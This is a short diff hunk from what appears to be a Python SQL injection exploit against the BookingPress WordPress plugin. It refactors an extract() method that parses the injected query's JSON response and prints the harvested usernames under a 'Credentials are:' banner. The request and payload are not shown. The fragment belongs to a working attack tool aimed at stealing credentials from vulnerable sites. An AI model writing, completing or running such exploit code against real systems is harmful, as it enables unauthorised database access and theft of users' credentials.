@@ -21,11 +21,8 @@ class SQL_Injection():
     def extract(self):
         print("\nCredentials are:")
         print("-"*50)
-        first_replace = self.payload.replace('[{"','')
-        second_replace = first_replace.replace('"},{"','":"')
-        third_replace = second_replace.replace('","','":"')
-        fourth_replace = third_replace.replace("}]","")
-        generate_list = fourth_replace.split('":"') 
+        prep_list = self.payload.replace('[{"','').replace('"},{"','":"').replace('","','":"').replace('"}]','')
+        generate_list = prep_list.split('":"')
         for each_entry in range(0,len(generate_list)):
             if generate_list[each_entry] == "bookingpress_service_id":
                 print("Username:",generate_list[each_entry+1])
